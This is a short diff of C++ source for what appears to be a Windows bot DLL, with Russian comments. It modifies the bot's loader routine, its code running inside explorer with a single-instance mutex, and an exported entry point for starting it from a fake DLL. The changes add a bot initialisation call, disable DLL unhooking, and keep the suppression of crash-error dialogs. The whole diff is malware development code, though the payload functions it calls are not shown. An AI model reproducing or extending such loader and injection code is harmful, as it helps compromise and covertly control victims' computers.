@@ -15,6 +15,7 @@
 #include "BotEvents.h"
 #include "Loader.h"
 #include "Config.h"
+#include "BotCore.h"
 
 
 #include "Crypt.h"
@@ -103,8 +104,8 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 {
 	DLLDBG("====>Bot DLL", "-------- LoaderRoutine (v10)");
 
-
-	UnhookDlls();
+	BOT::Initialize();
+	//UnhookDlls();
 
 	// Отключаем отображение ошибок при крахе процесса
 	DisableShowFatalErrorDialog();
@@ -168,6 +169,8 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 
 DWORD WINAPI ExplorerMain(LPVOID Data)
 {
+	BOT::Initialize();
+
 	// Пробуем захватить мьютекс для обеспечения единственного Bot.plug
 	// в explorer
 	bool Catched = TryToCatchHostLevelInstanceMutex("bplfklexpl");
@@ -175,11 +178,10 @@ DWORD WINAPI ExplorerMain(LPVOID Data)
 	DLLDBG("ExplorerMain", "TryToCatchHostLevelInstanceMutex() result=%d", Catched);
 	if (Catched == false) return 0;
 
-	DLLDBG("====>Bot DLL", "Запускаем бот. Префикс [%s]", GetPrefix());
-
-	UnhookDlls();
-
+	DLLDBG("====>Bot DLL", "Запускаем бот. Префикс [%s]", GetPrefix().t_str());
 	
+	//UnhookDlls();
+
 	// Отключаем отображение ошибок при крахе процесса
 	DisableShowFatalErrorDialog();
 
@@ -239,7 +241,7 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 // Експортируемая ф-ция для запуска Bot.plug из FakeDll.
 BOOL WINAPI StartFromFakeDll()
 {
-	DLLDBG("StartFromFakeDll", "Started and finished.");
+	DLLDBG("StartFromFakeDll", "Started.");
 	
 	// Пробуем захватить мьютекс для обеспечения единственного запуска StartFromFakeDll
 	// Если одновременно работает несколько процесов.
